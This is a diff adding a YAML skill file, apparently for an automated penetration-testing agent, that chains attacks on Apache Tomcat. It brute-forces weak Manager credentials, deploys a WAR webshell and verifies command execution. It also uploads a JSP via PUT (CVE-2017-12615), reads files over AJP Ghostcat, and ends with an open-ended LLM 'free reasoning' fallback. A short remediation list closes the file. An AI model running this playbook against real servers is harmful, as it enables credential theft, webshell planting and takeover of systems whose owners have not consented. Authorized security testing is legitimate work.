@@ -1,0 +1,138 @@
+skill_id: tomcat_exploit
+name: "Apache Tomcat 综合利用"
+category: server_misconfig
+phase: foothold
+version: "3.0"
+
+match:
+  rules:
+    - fingerprint_contains: ["tomcat"]
+    - fingerprint_contains: ["Apache Tomcat"]
+    - evidence_contains: ["tomcat"]
+    - evidence_contains: ["TOMCAT_MANAGER_CONFIRMED"]
+    - cve_matches:
+        - "CVE-2017-12615"
+        - "CVE-2020-1938"
+
+probes:
+  - id: confirm_tomcat
+    description: "确认 Tomcat 及版本"
+    steps:
+      - command: "bash {skill_dir}/scripts/tomcat_confirm.sh {ENDPOINT}"
+        parse_rules:
+          - if_contains: ["TOMCAT_CONFIRMED"]
+            set: { tomcat_confirmed: true }
+          - if_contains: ["Apache Tomcat"]
+            set: { tomcat_confirmed: true }
+
+      - command: "bash {skill_dir}/scripts/tomcat_manager_check.sh {ENDPOINT}"
+        parse_rules:
+          - if_contains: ["MANAGER_EXISTS"]
+            set: { manager_exists: true }
+
+  - id: check_ajp
+    description: "检查 AJP 端口"
+    depends_on: { tomcat_confirmed: true }
+    command: "bash {skill_dir}/scripts/tomcat_ajp_check.sh {TARGET_IP}"
+    parse_rules:
+      - if_contains: ["AJP_OPEN"]
+        set: { ajp_open: true }
+
+exploit_paths:
+  # 路径 A: Manager 弱口令 + WAR 部署
+  - path_id: manager_weak_cred
+    name: "Tomcat Manager 弱口令 + WAR 部署"
+    priority: 1
+    conditions:
+      tomcat_confirmed: true
+      manager_exists: true
+    steps:
+      - id: brute_creds
+        description: "遍历弱口令，有效凭据存 /tmp/tc_cred.txt"
+        command: "bash {skill_dir}/scripts/tomcat_brute_creds.sh {ENDPOINT}"
+        timeout: 180
+        success_criteria:
+          stdout_contains_any: ["CRED_FOUND"]
+        on_success: create_war
+        on_fail: next_path
+
+      - id: create_war
+        description: "生成 WAR 包"
+        command: "bash {skill_dir}/scripts/tomcat_create_war.sh"
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["WAR_CREATED"]
+        on_success: try_html_deploy
+        on_fail: next_path
+
+      - id: try_html_deploy
+        description: "通过 html/upload 部署（cookie jar + CSRF nonce）"
+        command: "bash {skill_dir}/scripts/tomcat_html_deploy.sh {ENDPOINT}"
+        timeout: 40
+        success_criteria:
+          stdout_contains_any: ["HTML_DEPLOY_OK"]
+        on_success: verify_rce
+        on_fail: next_path
+
+      - id: verify_rce
+        description: "访问 webshell 执行 id"
+        command: "bash {skill_dir}/scripts/tomcat_verify_rce.sh {ENDPOINT}"
+        timeout: 20
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|TOMCAT_RCE_CONFIRMED)"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "webshell_war"
+
+  # 路径 B: PUT 上传 JSP
+  - path_id: put_upload
+    name: "PUT 方法上传 JSP (CVE-2017-12615)"
+    priority: 2
+    conditions:
+      tomcat_confirmed: true
+    steps:
+      - id: put_jsp
+        description: "PUT 上传 JSP 并验证"
+        command: "bash {skill_dir}/scripts/tomcat_put_jsp.sh {ENDPOINT}"
+        timeout: 30
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|TOMCAT_PUT_RCE)"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "webshell_put"
+
+  # 路径 C: AJP Ghostcat
+  - path_id: ajp_ghostcat
+    name: "AJP Ghostcat 文件读取"
+    priority: 3
+    conditions:
+      tomcat_confirmed: true
+      ajp_open: true
+    steps:
+      - id: ghostcat_read
+        description: "通过 AJP 读取 WEB-INF/web.xml"
+        command: "bash {skill_dir}/scripts/tomcat_ghostcat.sh {TARGET_IP}"
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["web-app", "servlet", "xml version"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read_ajp"
+
+  # 路径 D: LLM 兜底
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      tomcat_confirmed: true
+
+remediation: |
+  1. 修改或禁用 Manager 默认凭据，限制访问 IP
+  2. 确保 DefaultServlet 的 readonly=true
+  3. 如不需要 AJP，删除 AJP Connector
+  4. 保持 Tomcat 版本更新
